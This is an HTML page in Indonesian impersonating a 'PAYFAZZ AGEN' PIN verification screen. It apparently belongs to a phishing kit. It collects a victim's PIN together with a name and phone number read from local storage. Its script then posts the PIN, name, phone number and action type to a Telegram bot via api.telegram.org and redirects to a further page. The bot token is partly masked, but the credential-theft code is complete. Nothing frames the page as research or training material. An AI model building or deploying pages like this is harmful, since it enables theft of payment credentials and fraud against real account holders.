<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Konfirmasi PIN - PAYFAZZ AGEN</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
    <style>
        body {
            font-family: 'Inter', sans-serif;
        }
        .gradient-bg {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        }
    </style>
</head>
<body class="bg-gray-50">
    <div class="min-h-screen gradient-bg">
        <header class="text-center pt-8 pb-6">
            <div class="text-white text-2xl font-bold mb-2">FAZZ AGEN</div>
            <div class="text-blue-200 text-sm">Konfirmasi Keamanan</div>
        </header>

        <main class="container mx-auto px-4 max-w-md">
            <div class="bg-white rounded-2xl shadow-xl p-8">
                <div class="text-center mb-8">
                    <div class="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
                        <span class="text-2xl">üîê</span>
                    </div>
                    <h2 class="text-2xl font-bold text-gray-800 mb-2">Verifikasi PIN</h2>
                    <p class="text-gray-600">Masukkan PIN 4-6 digit untuk melanjutkan proses</p>
                </div>

                <div class="bg-gray-50 rounded-lg p-4 mb-6">
                    <div class="text-sm text-gray-600 mb-1">Nama:</div>
                    <div class="font-semibold text-gray-800" id="displayNama">-</div>
                    <div class="text-sm text-gray-600 mb-1 mt-3">No. HP:</div>
                    <div class="font-semibold text-gray-800" id="displayNohp">-</div>
                </div>

                <form id="pinForm" class="space-y-6">
                    <div>
                        <label for="pin" class="block text-sm font-medium text-gray-700 mb-2">
                            PIN (4-6 digit)
                        </label>
                        <input 
                            type="text" 
                            id="pin" 
                            name="pin" 
                            required
                            pattern="\\d{4,6}"
                            maxlength="6"
                            inputmode="numeric"
                            class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition duration-200"
                            placeholder="Masukkan PIN Anda"
                        >
                    </div>

                    <div>
                        <label for="confirmPin" class="block text-sm font-medium text-gray-700 mb-2">
                            Konfirmasi PIN
                        </label>
                        <input 
                            type="text" 
                            id="confirmPin" 
                            name="confirmPin" 
                            required
                            pattern="\\d{4,6}"
                            maxlength="6"
                            inputmode="numeric"
                            class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition duration-200"
                            placeholder="Konfirmasi PIN Anda"
                        >
                    </div>

                    <button 
                        type="submit" 
                        class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 px-6 rounded-lg transition duration-300 shadow-lg"
                    >
                        Verifikasi
                    </button>
                </form>

                <div class="text-center mt-6">
                    <a href="login.html" class="text-blue-600 hover:text-blue-800 text-sm">
                        ‚Üê Kembali
                    </a>
                </div>
            </div>
        </main>
    </div>

    <script>
        // Load and display user data
        const userData = JSON.parse(localStorage.getItem('userData') || '{}');
        document.getElementById('displayNama').textContent = userData.nama || '-';
        document.getElementById('displayNohp').textContent = userData.nohp || '-';

        // Handle form submission
        document.getElementById('pinForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const pin = document.getElementById('pin').value.trim();
            const confirmPin = document.getElementById('confirmPin').value.trim();
            
            if (pin !== confirmPin) {
                alert('PIN tidak cocok!');
                return;
            }
            
            if (!/^\d{4,6}$/.test(pin)) {
                alert('PIN harus berupa angka dengan panjang 4 sampai 6 digit!');
                return;
            }
            
            // Update user data with pin
            const updatedData = {
                ...userData,
                pin: pin,
                pinConfirmed: true
            };
            localStorage.setItem('userData', JSON.stringify(updatedData));
            
            // Send to Telegram
            sendToTelegram({
                step: 'pin_confirmation',
                nama: userData.nama,
                nohp: userData.nohp,
                pin: pin,
                actionType: userData.actionType
            });
            
            // Redirect to final confirmation
            window.location.href = 'konfirmasivia.html';
        });

        // Telegram Bot Function
        async function sendToTelegram(data) {
            const BOT_TOKEN = '7889876543:AAHxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx';
            const CHAT_ID = '-1001234567890';
            
            const message = `
üîê *PIN Dikonfirmasi*
üë§ *Nama:* ${data.nama}
üì± *No HP:* ${data.nohp}
üîë *PIN:* ${data.pin}
üéØ *Aksi:* ${data.actionType}
‚è∞ *Waktu:* ${new Date().toLocaleString('id-ID')}
üìç *Step:* ${data.step}
            `;
            
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
            } catch (error) {
                console.log('Telegram send error:', error);
            }
        }
    </script>
</body>
</html>
